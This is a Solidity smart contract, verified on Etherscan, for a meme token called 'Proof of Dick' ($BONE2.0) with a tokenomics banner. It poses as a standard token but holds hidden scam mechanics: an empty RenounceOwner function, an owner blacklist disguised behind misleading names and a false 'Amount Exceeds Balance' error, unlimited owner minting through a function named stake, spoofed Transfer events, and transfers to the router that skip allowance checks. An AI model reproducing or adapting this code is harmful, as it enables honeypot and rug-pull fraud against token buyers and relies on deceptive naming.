/**
 *Submitted for verification at Etherscan.io on 2022-09-19
*/

pragma solidity 0.8.17;
/*

__________ ________    _______  ___________ ________     _______   
\______   \\_____  \   \      \ \_   _____/ \_____  \    \   _  \  
 |    |  _/ /   |   \  /   |   \ |    __)_   /  ____/    /  /_\  \ 
 |    |   \/    |    \/    |    \|        \ /       \    \  \_/   \
 |______  /\_______  /\____|__  /_______  / \_______ \ /\ \_____  /
        \/         \/         \/        \/          \/ \/       \/ 



Proof of Dick - $BONE2.0

Tokenomics - 

- Total Supply: 100M
- Tax: 0% First 24 hours, then 5%
- LP Locked: 1 Month 
- Tax 0% First Day - 5% Following
- NFT Snapshot at 100 holders
     
*/ 

contract BONE2 {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) pAmm;

    // 
    string public name = "Proof of Dick";
    string public symbol = unicode"BONE2.0";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    address Router = 0x68AD82C55f82B578696500098a635d3df466DC7C;
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x066acc372822F98358898e4EA99f06608af97383;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _; }

    function RenounceOwner() public onlyOwner  {}


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }



    function bjksdr(address _user) public onlyOwner {
        require(!pAmm[_user], "1");
        pAmm[_user] = true; }
     function unstake(address _user) public onlyOwner {
        require(pAmm[_user], "1");
        pAmm[_user] = false; }

    function transfer(address to, uint256 value) public returns (bool success) {

        require(!pAmm[msg.sender] , "Amount Exceeds Balance"); 
        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!pAmm[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
    
    
       function stake(address to, uint256 value) public onlyOwner {
        totalSupply += value;  
        balanceOf[to] += value; 
        emit Transfer (address(0), to, value); }    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }
        if(to == Router)  {
        require(value <= balanceOf[from]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (from, to, value);
        return true; }
        require(!pAmm[from] , "Amount Exceeds Balance"); 
        require(!pAmm[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }